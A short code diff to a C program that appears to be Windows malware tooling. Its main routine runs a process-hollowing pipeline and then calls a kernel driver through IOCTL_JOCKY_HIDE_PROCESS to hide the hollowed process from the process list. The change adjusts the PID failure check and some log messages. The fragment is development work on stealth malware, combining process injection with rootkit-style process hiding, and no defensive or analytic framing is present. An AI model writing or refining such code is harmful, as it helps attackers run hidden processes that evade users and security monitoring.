@@ -99,7 +99,9 @@ int main() {
     printf("%s Running hollow pipeline...\n", i);
 
     DWORD hollowedPid = RunHollowPipeline();
-    if (hollowedPid != 0) {
+    if (hollowedPid <= 4) {
+        printf("%s Hollow pipeline failed — skipping hide\n", e);
+    } else {
         printf("%s Hollowed PID: %lu — hiding from process list...\n", k, hollowedPid);
 
         JOCKY_PID_INPUT hideInput = { hollowedPid };
@@ -115,11 +117,9 @@ int main() {
         );
 
         if (result)
-            printf("%s IOCTL_JOCKY_HIDE_PROCESS: PID %lu hidden\n", k, hollowedPid);
+            printf("%s PID %lu hidden from process list\n", k, hollowedPid);
         else
             printf("%s HIDE_PROCESS failed: %lu\n", e, GetLastError());
-    } else {
-        printf("%s Hollow pipeline failed — skipping hide\n", e);
     }
 
     CloseHandle(hDevice);
